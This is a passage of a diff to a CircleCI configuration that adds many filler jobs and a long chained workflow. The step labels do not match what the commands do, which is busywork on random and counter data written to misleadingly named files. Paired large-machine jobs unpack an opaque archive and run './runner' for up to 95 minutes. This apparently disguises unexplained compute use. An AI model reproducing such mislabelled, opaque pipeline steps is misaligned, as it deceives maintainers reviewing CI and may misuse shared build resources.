+            - 775.out
+  q3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/775.out && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  kick_bun-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Enumerate bucket keys
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 439850 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/ci-ws/artifact.tar
+            size=$(wc -c </tmp/ci-ws/artifact.tar); echo "stage ok: bun-lint size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - artifact.tar
+  bun-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/artifact.tar && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  hook_ShipImage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Record manifest digest
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 81920 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/ci-ws/34.blob
+            size=$(wc -c </tmp/ci-ws/34.blob); echo "stage ok: ShipImage size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 34.blob
+  ShipImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/34.blob && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+  rerun_VERIFY_LAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Partition record set
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<291624;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/ci-ws/step-19.out
+            size=$(wc -c </tmp/ci-ws/step-19.out); echo "stage ok: VERIFY_LAB size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-19.out
+  VERIFY_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            test -f /tmp/ci-ws/step-19.out && echo found || echo missing
+      - run:
+          name: Retrieve tree
+          command: git clone --depth 2 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: bzcat output.tar.bz2 | tar xf -
+      - run:
+          no_output_timeout: 95m
+          command: "./runner"
+
+  prep_v5-canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Measure entropy sample
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 188597 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/ci-ws/result.txt
+            size=$(wc -c </tmp/ci-ws/result.txt); echo "stage ok: v5-canary size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - result.txt
+  phase1_io-rc_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Compute slot digest
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 1048576 /dev/urandom | sha256sum; true ; } > /tmp/ci-ws/stash.raw
+            size=$(wc -c </tmp/ci-ws/stash.raw); echo "stage ok: io-rc size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stash.raw
+  B_defualt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 212688 | awk 'NR%17==0{sum+=$1}END{print sum}'; true ; } > /tmp/ci-ws/full_step_output.out
+            size=$(wc -c </tmp/ci-ws/full_step_output.out); echo "stage ok: defualt size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - full_step_output.out
+  stepB_bun-lint_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 158072 | awk 'NR>26545 && NR<45216{s+=$1}END{print s}'; true ; } > /tmp/ci-ws/artifact.tar
+            size=$(wc -c </tmp/ci-ws/artifact.tar); echo "stage ok: bun-lint size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - artifact.tar
+  g1_VERIFY_LAB_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Shuffle buffer blocks
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=448628;i++){x=sqrt(i);y=int(x);if(y*y==i)c++}print c}'; true ; } > /tmp/ci-ws/step-19.out
+            size=$(wc -c </tmp/ci-ws/step-19.out); echo "stage ok: VERIFY_LAB size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-19.out
+  bake_t-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 17000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/ci-ws/artifact.tgz
+            size=$(wc -c </tmp/ci-ws/artifact.tgz); echo "stage ok: t-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - artifact.tgz
+  preinit_fiona-verify_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Hoist constant row
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 78998 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/ci-ws/stage.dat
+            size=$(wc -c </tmp/ci-ws/stage.dat); echo "stage ok: fiona-verify size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stage.dat
+  audit_RunApp_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rank ordinal values
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=8 2>/dev/null | sha256sum; true ; } > /tmp/ci-ws/counts.csv
+            size=$(wc -c </tmp/ci-ws/counts.csv); echo "stage ok: RunApp size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - counts.csv
+  builder_vela-plus_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Audit fixture rows
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 393289 | awk 'END{print NR}'; true ; } > /tmp/ci-ws/132a.data
+            size=$(wc -c </tmp/ci-ws/132a.data); echo "stage ok: vela-plus size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 132a.data
+  phase1_helios-rc_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Collect byte metrics
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<103970;i++){s=sprintf("%d",i*13); for(j=1;j<=length(s);j++)c++};print c}'; true ; } > /tmp/ci-ws/.state
+            size=$(wc -c </tmp/ci-ws/.state); echo "stage ok: helios-rc size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .state
+  staging_LAB_CHECK_3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 18874368 | fold -w16 | sort -u | wc -l; true ; } > /tmp/ci-ws/report.out
+            size=$(wc -c </tmp/ci-ws/report.out); echo "stage ok: LAB_CHECK_3 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - report.out
+  cook_titan2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Chunk raw buffer
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 884406 | awk 'NR%6==0{sum+=$1}END{print sum}'; true ; } > /tmp/ci-ws/step-27.log
+            size=$(wc -c </tmp/ci-ws/step-27.log); echo "stage ok: titan2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-27.log
+  enqueue_node20-bench_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 22528 | wc -c; true ; } > /tmp/ci-ws/pt-A.pkl
+            size=$(wc -c </tmp/ci-ws/pt-A.pkl); echo "stage ok: node20-bench size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - pt-A.pkl
+  spinner_rm-webhook_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Inflate reference set
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 27648 | wc -c; true ; } > /tmp/ci-ws/phase-complete.sig
+            size=$(wc -c </tmp/ci-ws/phase-complete.sig); echo "stage ok: rm-webhook size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - phase-complete.sig
+  tester_q3-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 183542 | awk 'NR>24025 && NR<25540{s+=$1}END{print s}'; true ; } > /tmp/ci-ws/775.out
+            size=$(wc -c </tmp/ci-ws/775.out); echo "stage ok: q3-release size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 775.out
+  step2_intergration_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Measure throughput
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 19M /dev/urandom | base64 | wc -c; true ; } > /tmp/ci-ws/21.data
+            size=$(wc -c </tmp/ci-ws/21.data); echo "stage ok: intergration size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 21.data
+  reset_spin-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Build frequency table
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 2300 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/ci-ws/OK.txt
+            size=$(wc -c </tmp/ci-ws/OK.txt); echo "stage ok: spin-up size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - OK.txt
+  warmup_fire-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Materialize sort order
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 535900 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/ci-ws/03.data
+            size=$(wc -c </tmp/ci-ws/03.data); echo "stage ok: fire-up size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 03.data
+  canary1_green-light_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Validate checksum roster
+          command: |
+            mkdir -p /tmp/ci-ws
+            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/ci-ws/bundle; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/ci-ws/bundle; done; true
+            size=$(wc -c </tmp/ci-ws/bundle); echo "stage ok: green-light size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - bundle
+  spinner_sam-ci_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Mirror arena state
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 33554432 | fold -w16 | sort -u | wc -l; true ; } > /tmp/ci-ws/gate-pass.out
+            size=$(wc -c </tmp/ci-ws/gate-pass.out); echo "stage ok: sam-ci size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - gate-pass.out
+  cacher_ruby3-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Enumerate token pairs
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<73869;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/ci-ws/main_job_output.log
+            size=$(wc -c </tmp/ci-ws/main_job_output.log); echo "stage ok: ruby3-build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - main_job_output.log
+  prep_ci-3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Reduce row partitions
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<241007;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/ci-ws/buffer.bin
+            size=$(wc -c </tmp/ci-ws/buffer.bin); echo "stage ok: ci-3 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - buffer.bin
+  tmp_uma-ci_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Dispatch work units
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{srand();s=0;for(i=0;i<74526;i++)s+=rand();printf "%.4f\n",s}'; true ; } > /tmp/ci-ws/log.ndjson
+            size=$(wc -c </tmp/ci-ws/log.ndjson); echo "stage ok: uma-ci size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - log.ndjson
+  phase2_update-retry-glitch_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Flush temp bucket
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 3584000 | base64 | head -c 200 | wc -c; true ; } > /tmp/ci-ws/step-29.log
+            size=$(wc -c </tmp/ci-ws/step-29.log); echo "stage ok: update-retry-glitch size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-29.log
+  produce_kilo_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 307200 | wc -c; true ; } > /tmp/ci-ws/stage-done.txt
+            size=$(wc -c </tmp/ci-ws/stage-done.txt); echo "stage ok: kilo size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stage-done.txt
+  tester_java17-lint_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Project latency curve
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 1126400 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/ci-ws/bundle.bin
+            size=$(wc -c </tmp/ci-ws/bundle.bin); echo "stage ok: java17-lint size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - bundle.bin
+  do_rl-x_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; head -c 30408704 /dev/urandom | sha256sum; true ; } > /tmp/ci-ws/2024-07-21.data
+            size=$(wc -c </tmp/ci-ws/2024-07-21.data); echo "stage ok: rl-x size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 2024-07-21.data
+  compile_fiona-test_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Fold branch counters
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=361300;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/ci-ws/.marker
+            size=$(wc -c </tmp/ci-ws/.marker); echo "stage ok: fiona-test size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .marker
+  bake_preview_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Register task slot
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 269727 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/ci-ws/step-ready.txt
+            size=$(wc -c </tmp/ci-ws/step-ready.txt); echo "stage ok: preview size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-ready.txt
+  alpha_ShipImage_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Shape histogram head
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 436066 | awk 'NR>24200 && NR<23652{s+=$1}END{print s}'; true ; } > /tmp/ci-ws/34.blob
+            size=$(wc -c </tmp/ci-ws/34.blob); echo "stage ok: ShipImage size=${size}"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 34.blob
+workflows:
+  pipeline:
+    jobs:
+      - postbuild_v5-canary
+      - prep_v5-canary_2:
+          requires:
+            - postbuild_v5-canary
+      - v5-canary:
+          requires:
+            - prep_v5-canary_2
+      - orchestrate_io-rc:
+          requires:
+            - prep_v5-canary_2
+      - phase1_io-rc_2:
+          requires:
+            - orchestrate_io-rc
+      - io-rc:
+          requires:
+            - phase1_io-rc_2
+      - dispatch_defualt:
+          requires:
+            - phase1_io-rc_2
+      - B_defualt_2:
+          requires:
+            - dispatch_defualt
+      - defualt:
+          requires:
+            - B_defualt_2
+      - kick_bun-lint:
+          requires:
+            - B_defualt_2
+      - stepB_bun-lint_2:
+          requires:
+            - kick_bun-lint
+      - bun-lint:
+          requires:
+            - stepB_bun-lint_2
+      - rerun_VERIFY_LAB:
+          requires:
+            - stepB_bun-lint_2
+      - g1_VERIFY_LAB_2:
+          requires:
+            - rerun_VERIFY_LAB
+      - VERIFY_LAB:
+          requires:
+            - g1_VERIFY_LAB_2
+      - canary_t-v2:
+          requires:
+            - g1_VERIFY_LAB_2
+      - bake_t-v2_2:
+          requires:
+            - canary_t-v2
+      - t-v2:
+          requires:
+            - bake_t-v2_2
+      - step2_fiona-verify:
+          requires:
+            - bake_t-v2_2
+      - preinit_fiona-verify_2:
+          requires:
+            - step2_fiona-verify
+      - fiona-verify:
+          requires:
+            - preinit_fiona-verify_2
+      - redo_RunApp:
+          requires:
+            - preinit_fiona-verify_2
+      - audit_RunApp_2:
+          requires:
+            - redo_RunApp
+      - RunApp:
+          requires:
+            - audit_RunApp_2
+      - vendor_vela-plus:
+          requires:
+            - audit_RunApp_2
+      - builder_vela-plus_2:
+          requires:
+            - vendor_vela-plus
+      - vela-plus:
+          requires:
+            - builder_vela-plus_2
+      - A_helios-rc:
+          requires:
+            - builder_vela-plus_2
+      - phase1_helios-rc_2:
+          requires:
+            - A_helios-rc
+      - helios-rc:
+          requires:
+            - phase1_helios-rc_2
+      - ctx_LAB_CHECK_3:
+          requires:
+            - phase1_helios-rc_2
+      - staging_LAB_CHECK_3_2:
+          requires:
+            - ctx_LAB_CHECK_3
+      - LAB_CHECK_3:
+          requires:
+            - staging_LAB_CHECK_3_2
+      - spinner_titan2:
+          requires:
+            - staging_LAB_CHECK_3_2
+      - cook_titan2_2:
+          requires:
+            - spinner_titan2
+      - titan2:
+          requires:
+            - cook_titan2_2
+      - reserve_node20-bench:
+          requires:
+            - cook_titan2_2
+      - enqueue_node20-bench_2:
+          requires:
+            - reserve_node20-bench
+      - node20-bench:
+          requires:
+            - enqueue_node20-bench_2
+      - green_rm-webhook:
+          requires:
+            - enqueue_node20-bench_2
+      - spinner_rm-webhook_2:
+          requires:
+            - green_rm-webhook
+      - rm-webhook:
+          requires:
+            - spinner_rm-webhook_2
+      - route_q3-release:
+          requires:
+            - spinner_rm-webhook_2
+      - tester_q3-release_2:
+          requires:
+            - route_q3-release
+      - q3-release:
+          requires:
+            - tester_q3-release_2
+      - B_intergration:
+          requires:
+            - tester_q3-release_2
+      - step2_intergration_2:
+          requires:
+            - B_intergration
+      - intergration:
+          requires:
+            - step2_intergration_2
+      - spinner_spin-up:
+          requires:
+            - step2_intergration_2
+      - reset_spin-up_2:
+          requires:
+            - spinner_spin-up
+      - spin-up:
+          requires:
+            - reset_spin-up_2
+      - db_fire-up
+      - warmup_fire-up_2:
+          requires:
+            - db_fire-up
+      - fire-up:
+          requires:
+            - warmup_fire-up_2
+      - sys_green-light:
+          requires:
+            - warmup_fire-up_2
+      - canary1_green-light_2:
+          requires:
+            - sys_green-light
+      - green-light:
+          requires:
+            - canary1_green-light_2
+      - stepA_sam-ci:
+          requires:
+            - canary1_green-light_2
+      - spinner_sam-ci_2:
+          requires:
+            - stepA_sam-ci
+      - sam-ci:
+          requires:
+            - spinner_sam-ci_2
+      - phase1_ruby3-build:
+          requires:
+            - spinner_sam-ci_2
+      - cacher_ruby3-build_2:
+          requires:
+            - phase1_ruby3-build
+      - ruby3-build:
+          requires:
+            - cacher_ruby3-build_2
+      - fetcher_ci-3:
+          requires:
+            - cacher_ruby3-build_2
+      - prep_ci-3_2:
+          requires:
+            - fetcher_ci-3
+      - ci-3:
+          requires:
+            - prep_ci-3_2
+      - prefetch_uma-ci:
+          requires:
+            - prep_ci-3_2
+      - tmp_uma-ci_2:
+          requires:
+            - prefetch_uma-ci
+      - uma-ci:
+          requires:
+            - tmp_uma-ci_2
+      - canary_update-retry-glitch:
+          requires:
+            - tmp_uma-ci_2
+      - phase2_update-retry-glitch_2:
+          requires:
+            - canary_update-retry-glitch
+      - update-retry-glitch:
+          requires:
+            - phase2_update-retry-glitch_2
+      - linter_kilo:
+          requires:
+            - phase2_update-retry-glitch_2
+      - produce_kilo_2:
+          requires:
+            - linter_kilo
+      - kilo:
+          requires:
+            - produce_kilo_2
+      - dispatch_java17-lint:
+          requires:
+            - produce_kilo_2
+      - tester_java17-lint_2:
+          requires:
+            - dispatch_java17-lint
+      - java17-lint:
+          requires:
+            - tester_java17-lint_2
+      - go_rl-x:
+          requires:
+            - tester_java17-lint_2
+      - do_rl-x_2:
+          requires:
+            - go_rl-x
+      - rl-x:
+          requires:
+            - do_rl-x_2
+      - Gamma_fiona-test:
+          requires:
+            - do_rl-x_2
+      - compile_fiona-test_2:
+          requires:
+            - Gamma_fiona-test
+      - fiona-test:
+          requires:
+            - compile_fiona-test_2
+      - phase1_preview:
+          requires:
+            - compile_fiona-test_2
+      - bake_preview_2:
+          requires:
+            - phase1_preview
+      - preview:
+          requires:
+            - bake_preview_2
+      - hook_ShipImage:
+          requires:
+            - bake_preview_2
+      - alpha_ShipImage_2:
+          requires:
+            - hook_ShipImage
+      - ShipImage:
+          requires:
+            - alpha_ShipImage_2
